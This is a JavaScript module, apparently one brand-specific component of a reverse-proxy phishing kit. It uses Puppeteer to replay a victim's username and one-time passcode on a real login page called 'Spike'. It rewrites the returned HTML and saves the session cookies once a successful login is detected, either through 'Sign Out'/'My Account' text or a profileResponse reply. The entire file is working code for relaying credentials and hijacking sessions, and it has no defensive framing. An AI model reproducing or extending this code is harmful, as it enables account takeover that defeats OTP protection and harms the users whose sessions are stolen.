const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                let username = `[name="username"]`
                page.waitForSelector(username)
                await page.type(username, this.email)

                await page.click(`[type="submit"]`)
                await page.waitForResponse(response => {
                    return response.request().resourceType() === 'xhr' || response.request().resourceType() === 'fetch'
                })
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["Sign Out", "My Account"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-email") {
                let username = `[name="username"]`
                await page.waitForSelector(username)
                await page.type(username, body.username)
                await page.click(`[type="submit"]`)

                await page.waitForResponse(async response => {
                    if (response.request().resourceType() === 'xhr' || response.request().resourceType() === 'fetch') {
                        await new Promise(re => setTimeout(re, 1000))
                        return true
                    }
                })
            } else if (spikeType == "otp") {
                let otpInput = '[name="otp"]'

                await page.waitForSelector(otpInput)
                await page.evaluate((otpInput) => {
                    document.querySelector(otpInput).value = ""
                    document.querySelector(otpInput).setAttribute("value", "")
                }, otpInput)

                await page.type(otpInput, body.otp)
                await page.click(`[type="submit"]`)

                let checkOtp = false
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() === 'xhr' || response.request().resourceType() === 'fetch') {
                        const contentType = response.headers()['content-type']
                        if (contentType.includes('application/json')) {
                            const data = await response.json()
                            if (data.hasOwnProperty("profileResponse")) { checkOtp = true }
                        }
                        return true
                    }
                })

                if (checkOtp) return await this.saveCookies()
            } else if (spikeType == "resend-otp") {
                let resetBtn = ".input-extra-options-desktop"
                await page.waitForSelector(resetBtn)

                await page.click(resetBtn)
                await page.waitForResponse(response => {
                    return response.request().resourceType() === 'xhr' || response.request().resourceType() === 'fetch'
                })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }